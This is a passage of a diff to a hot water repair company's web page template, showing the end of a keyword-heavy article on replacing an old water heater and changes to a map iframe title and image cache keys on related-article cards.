greenhouse gas emissions. By upgrading to a modern water heater, you can lower your home's environmental impact and play a part in sustainable living practices. Hot Water System Repairs have shown that newer models are designed to operate more efficiently, thereby reducing energy consumption and overall emissions.<br/><br/>Furthermore, opting for a more energy-efficient water heater not only benefits the environment but also brings about potential cost savings in the long run. With advancements in technology, newer models are better equipped to provide the necessary heating while consuming less energy. This not only reduces your carbon footprint but can also lead to lower energy bills over time. Hot Water System Repairs recommend investing in a modern water heater to enjoy improved performance, lower energy consumption, and a reduced environmental impact.</p><h2 id="benefits-of-upgrading-to-a-modern-water-heater">Benefits of upgrading to a modern water heater</h2><p>Upgrading to a modern water heater offers several advantages that could make a significant difference in your household. Primarily, newer models are designed to be more energy-efficient, leading to potential cost savings on your utility bills. Enhanced technology enables these modern systems to heat water more efficiently, ensuring that you have a continuous supply of hot water while reducing wastage.<br/><br/>Furthermore, modern water heaters are known for their improved reliability and performance. By replacing your outdated water heater with a newer model, you can reduce the likelihood of breakdowns and the need for frequent Hot Water System Repairs. This not only saves you time and hassle but also ensures that you have access to hot water whenever you need it without any interruptions.</p><h3 id="improved-reliability-and-performance">Improved reliability and performance</h3><p>If you've been experiencing frequent breakdowns or inconsistent water temperature with your old water heater, upgrading to a newer model could significantly improve the reliability and performance of your hot water system. Modern water heaters are built with advanced technology that ensures more efficient and consistent heating, reducing the need for frequent repairs and maintenance. By investing in a new water heater, you can enjoy a reliable hot water supply without the hassle of dealing with continuous issues.<br/><br/>Hot water system repairs can be costly and disruptive to your daily routine. By replacing your 15-year-old water heater with a new, more efficient model, you can avoid the inconvenience of unexpected breakdowns and the expenses associated with constant repairs. Additionally, modern water heaters are designed to provide better performance, delivering hot water more quickly and consistently throughout your home. Upgrade to a new water heater today to enjoy reliable hot water and eliminate the need for frequent Hot Water System Repairs.</p><h2 id="types-of-water-heaters-to-consider-as-replacements">Types of water heaters to consider as replacements</h2><p>When it comes to replacing an old water heater, homeowners have several options to consider. One popular choice is the traditional storage tank water heater. These systems store and heat water in a tank, ensuring a constant supply of hot water for daily needs. On the other hand, tankless water heaters have gained popularity due to their energy efficiency and space-saving benefits. These units heat water on demand, providing hot water without the need for a storage tank. Additionally, heat pump water heaters extract heat from the air to warm the water, making them another eco-friendly option to consider for your home. Hot Water System Repairs are essential to ensure the longevity and efficiency of any chosen water heater type.</p><h3 id="tankless-vs-traditional-systems">Tankless vs. traditional systems</h3><p>When deciding between a tankless and a traditional water heater, there are important factors to consider. Tankless systems, also known as instantaneous or on-demand water heaters, heat water directly without the use of a storage tank. This means they provide hot water as needed, resulting in energy efficiency and cost savings over time. On the other hand, traditional water heaters store and heat water in a tank, ensuring a constant supply of hot water but may be less energy-efficient compared to tankless systems.<br/><br/>One key difference to note between tankless and traditional systems is the maintenance and repair requirements. Tankless systems generally have a longer lifespan and may require fewer repairs compared to traditional water heaters. However, when maintenance is needed, it can be more complex and may require specialised services such as Hot Water System Repairs. Traditional water heaters, while simpler in design, may need more frequent repairs and maintenance to ensure optimal performance and longevity.</p><h2 id="faqs">FAQS</h2><h3 id="is-it-necessary-to-replace-my-15-year-old-water-heater">Is it necessary to replace my 15 year old water heater?</h3><p>While it's not mandatory, replacing a 15 year old water heater can lead to improved energy efficiency and performance.</p><h3 id="how-do-old-water-heaters-impact-the-environment">How do old water heaters impact the environment?</h3><p>Old water heaters can contribute to higher energy consumption and greenhouse gas emissions due to inefficiency.</p><h3 id="what-are-the-benefits-of-upgrading-to-a-modern-water-heater">What are the benefits of upgrading to a modern water heater?</h3><p>Upgrading to a newer, more energy-efficient water heater can result in improved reliability, performance, and reduced operating costs.</p><h3 id="what-types-of-water-heaters-should-i-consider-as-replacements">What types of water heaters should I consider as replacements?</h3><p>When considering replacements, you may explore options such as tankless water heaters or more traditional systems based on your specific needs and preferences.</p><h3 id="how-does-upgrading-to-a-newer-water-heater-reduce-my-carbon-footprint">How does upgrading to a newer water heater reduce my carbon footprint?</h3><p>Newer water heaters are designed to operate more efficiently, resulting in reduced energy consumption and ultimately a lower carbon footprint compared to older models.</p>
 </div>
         </div>
     </div>
@@ -303,7 +305,7 @@
         <div class="row bg-section-light rounded g-0 g-md-4">
             <div class="col-12 col-lg-5 align-self-center">
                 <div class="card h-100 border-0 p-0 bg-section-light" style="display: {{is_contact_iframe_url}}">
-                    <iframe
+                    <iframe title="Locate Us"
                             src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
                             class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                             referrerpolicy="no-referrer-when-downgrade"></iframe>
@@ -344,7 +346,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-repairs-326490.jpg?key=qISlVZ" alt="Hot Water System Repairs" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-repairs-326490.jpg?key=5kV85j" alt="Hot Water System Repairs" class="rounded"
                                  width="80" height="80">
                             <a href="hot-water-system-repairs.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Hot Water System Repairs
@@ -356,7 +358,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-should-a-hot-water-system-last-326887.jpg?key=F3NwhH" alt="How long should a hot water system last?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-should-a-hot-water-system-last-326887.jpg?key=shkGtd" alt="How long should a hot water system last?" class="rounded"
                                  width="80" height="80">
                             <a href="how-long-should-a-hot-water-system-last.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How long should a hot water system last?
@@ -368,7 +370,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-my-hot-water-system-not-working-326888.jpg?key=rgtPS5" alt="Why is my hot water system not working?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-my-hot-water-system-not-working-326888.jpg?key=TPJ0Hk" alt="Why is my hot water system not working?" class="rounded"
                                  width="80" height="80">
                             <a href="why-is-my-hot-water-system-not-working.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Why is my hot water system not working?
@@ -380,7 +382,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-tell-if-your-hot-water-system-is-broken-326889.jpg?key=cYqtoj" alt="How to tell if your hot water system is broken?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-tell-if-your-hot-water-system-is-broken-326889.jpg?key=LwJzAg" alt="How to tell if your hot water system is broken?" class="rounded"
                                  width="80" height="80">
                             <a href="how-to-tell-if-your-hot-water-system-is-broken.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How to tell if your hot water system is broken?
@@ -392,7 +394,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-get-my-hot-water-working-again-326890.jpg?key=J2qVIj" alt="How do I get my hot water working again?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-get-my-hot-water-working-again-326890.jpg?key=PQ8sAE" alt="How do I get my hot water working again?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-i-get-my-hot-water-working-again.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do I get my hot water working again?
@@ -404,7 +406,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-are-signs-that-your-hot-water-heater-is-going-out-326891.jpg?key=QL54yw" alt="What are signs that your hot water heater is going out?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-are-signs-that-your-hot-water-heater-is-going-out-326891.jpg?key=oYn7wA" alt="What are signs that your hot water heater is going out?" class="rounded"
                                  width="80" height="80">
                             <a href="what-are-signs-that-your-hot-water-heater-is-going-out.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What are signs that your hot water heater is going out?
@@ -416,7 +418,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-hot-water-systems-need-servicing-2-326892.jpg?key=rArXYV" alt="Do hot water systems need servicing?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-hot-water-systems-need-servicing-2-326892.jpg?key=2NvjiY" alt="Do hot water systems need servicing?" class="rounded"
                                  width="80" height="80">
                             <a href="do-hot-water-systems-need-servicing-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Do hot water systems need servicing?
@@ -428,7 +430,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-would-hot-water-suddenly-stop-working-326893.jpg?key=UHvucc" alt="Why would hot water suddenly stop working?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-would-hot-water-suddenly-stop-working-326893.jpg?key=9jgsOu" alt="Why would hot water suddenly stop working?" class="rounded"
                                  width="80" height="80">
                             <a href="why-would-hot-water-suddenly-stop-working.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Why would hot water suddenly stop working?
@@ -440,7 +442,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-test-hot-water-thermostat-in-australia-326894.jpg?key=1XqhXy" alt="How to test hot water thermostat in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-test-hot-water-thermostat-in-australia-326894.jpg?key=zFdTkm" alt="How to test hot water thermostat in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="how-to-test-hot-water-thermostat-in-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How to test hot water thermostat in Australia?
@@ -452,7 +454,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-hot-water-systems-have-a-reset-button-326895.jpg?key=loCXWJ" alt="Do hot water systems have a reset button?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-hot-water-systems-have-a-reset-button-326895.jpg?key=tiuXl7" alt="Do hot water systems have a reset button?" class="rounded"
                                  width="80" height="80">
                             <a href="do-hot-water-systems-have-a-reset-button.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Do hot water systems have a reset button?
@@ -464,7 +466,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-know-you-need-a-new-hot-water-system-326896.jpg?key=m4Knih" alt="How do you know you need a new hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-know-you-need-a-new-hot-water-system-326896.jpg?key=V5C5Rm" alt="How do you know you need a new hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-know-you-need-a-new-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you know you need a new hot water system?
@@ -476,7 +478,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-test-a-hot-water-system-1-326897.jpg?key=PKOZsC" alt="How do you test a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-test-a-hot-water-system-1-326897.jpg?key=rCSEdB" alt="How do you test a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-test-a-hot-water-system-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you test a hot water system?
@@ -488,7 +490,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-there-no-hot-water-from-my-taps-326898.jpg?key=aH4jIu" alt="Why is there no hot water from my taps?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-there-no-hot-water-from-my-taps-326898.jpg?key=zgmjh3" alt="Why is there no hot water from my taps?" class="rounded"
                                  width="80" height="80">
                             <a href="why-is-there-no-hot-water-from-my-taps.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Why is there no hot water from my taps?
@@ -500,7 +502,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-there-no-hot-water-coming-from-my-hot-water-system-1-326899.jpg?key=iTSgVb" alt="Why is there no hot water coming from my hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-there-no-hot-water-coming-from-my-hot-water-system-1-326899.jpg?key=PGbVL0" alt="Why is there no hot water coming from my hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="why-is-there-no-hot-water-coming-from-my-hot-water-system-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Why is there no hot water coming from my hot water system?
@@ -512,7 +514,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-my-hot-water-not-working-but-my-cold-water-is-326900.jpg?key=IwkYBx" alt="Why is my hot water not working but my cold water is?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/why-is-my-hot-water-not-working-but-my-cold-water-is-326900.jpg?key=EUIF78" alt="Why is my hot water not working but my cold water is?" class="rounded"
                                  width="80" height="80">
                             <a href="why-is-my-hot-water-not-working-but-my-cold-water-is.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Why is my hot water not working but my cold water is?
@@ -524,7 +526,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/when-i-turn-my-shower-to-hot-no-water-comes-out-326901.jpg?key=lEN2nP" alt="When I turn my shower to hot, no water comes out.?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/when-i-turn-my-shower-to-hot-no-water-comes-out-326901.jpg?key=UhFG83" alt="When I turn my shower to hot, no water comes out.?" class="rounded"
                                  width="80" height="80">
                             <a href="when-i-turn-my-shower-to-hot-no-water-comes-out.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 When I turn my shower to hot, no water comes out.?
@@ -536,7 +538,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-it-to-repair-a-hot-water-heater-326931.jpg?key=WJ4HQE" alt="Is it worth it to repair a hot water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-worth-it-to-repair-a-hot-water-heater-326931.jpg?key=YALYeo" alt="Is it worth it to repair a hot water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="is-it-worth-it-to-repair-a-hot-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is it worth it to repair a hot water heater?
@@ -548,7 +550,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-common-problem-with-water-heaters-326933.jpg?key=Ki1jCs" alt="What is the most common problem with water heaters?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-most-common-problem-with-water-heaters-326933.jpg?key=kGQUcX" alt="What is the most common problem with water heaters?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-most-common-problem-with-water-heaters.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the most common problem with water heaters?
@@ -560,7 +562,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-last-3-326934.jpg?key=0lszoq" alt="How long do hot water systems last?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-last-3-326934.jpg?key=V0En0y" alt="How long do hot water systems last?" class="rounded"
                                  width="80" height="80">
                             <a href="how-long-do-hot-water-systems-last-3.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How long do hot water systems last?
@@ -572,7 +574,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-system-be-serviced-4-326935.jpg?key=TWBaE6" alt="How often should a hot water system be serviced?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-system-be-serviced-4-326935.jpg?key=jJCNrE" alt="How often should a hot water system be serviced?" class="rounded"
                                  width="80" height="80">
                             <a href="how-often-should-a-hot-water-system-be-serviced-4.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should a hot water system be serviced?
@@ -584,7 +586,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-life-of-a-hot-water-heater-326936.jpg?key=Yi7VOs" alt="What is the average life of a hot water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-life-of-a-hot-water-heater-326936.jpg?key=kKWqmM" alt="What is the average life of a hot water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-average-life-of-a-hot-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the average life of a hot water heater?
@@ -596,7 +598,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-know-if-your-hot-water-system-needs-replacing-3-326937.jpg?key=JarHLD" alt="How do you know if your hot water system needs replacing?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-know-if-your-hot-water-system-needs-replacing-3-326937.jpg?key=HOy7zj" alt="How do you know if your hot water system needs replacing?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-know-if-your-hot-water-system-needs-replacing-3.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you know if your hot water system needs replacing?
@@ -608,7 +610,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-my-water-heater-every-year-2-326939.jpg?key=QG8Rzo" alt="Should I flush my water heater every year?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-my-water-heater-every-year-2-326939.jpg?key=5DiXTp" alt="Should I flush my water heater every year?" class="rounded"
                                  width="80" height="80">
                             <a href="should-i-flush-my-water-heater-every-year-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Should I flush my water heater every year?
@@ -620,7 +622,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-should-a-rheem-hot-water-system-last-326940.jpg?key=VbIlnO" alt="How long should a Rheem hot water system last?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-should-a-rheem-hot-water-system-last-326940.jpg?key=viGlr1" alt="How long should a Rheem hot water system last?" class="rounded"
                                  width="80" height="80">
                             <a href="how-long-should-a-rheem-hot-water-system-last.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How long should a Rheem hot water system last?
@@ -632,7 +634,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-service-a-hot-water-system-1-326941.jpg?key=NUpuu4" alt="How to service a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-service-a-hot-water-system-1-326941.jpg?key=QZ9zja" alt="How to service a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-to-service-a-hot-water-system-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How to service a hot water system?
@@ -644,7 +646,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-to-check-when-hot-water-is-not-working-326942.jpg?key=qUtv7v" alt="What to check when hot water is not working?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-to-check-when-hot-water-is-not-working-326942.jpg?key=FImx6p" alt="What to check when hot water is not working?" class="rounded"
                                  width="80" height="80">
                             <a href="what-to-check-when-hot-water-is-not-working.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What to check when hot water is not working?
@@ -656,7 +658,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-3-326943.jpg?key=VNKSM3" alt="How much does it cost to replace a hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-3-326943.jpg?key=IYBNG8" alt="How much does it cost to replace a hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="how-much-does-it-cost-to-replace-a-hot-water-system-in-australia-3.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How much does it cost to replace a hot water system in Australia?
@@ -668,7 +670,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-usually-last-326944.jpg?key=k7cJ8t" alt="How long do hot water systems usually last?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-long-do-hot-water-systems-usually-last-326944.jpg?key=VXs6hv" alt="How long do hot water systems usually last?" class="rounded"
                                  width="80" height="80">
                             <a href="how-long-do-hot-water-systems-usually-last.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How long do hot water systems usually last?
@@ -680,7 +682,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-you-repair-a-leaking-hot-water-system-1-326945.jpg?key=lNNY2f" alt="Can you repair a leaking hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-you-repair-a-leaking-hot-water-system-1-326945.jpg?key=tN7GHv" alt="Can you repair a leaking hot water system?" class="rounded"
                                  width="80" height="80">
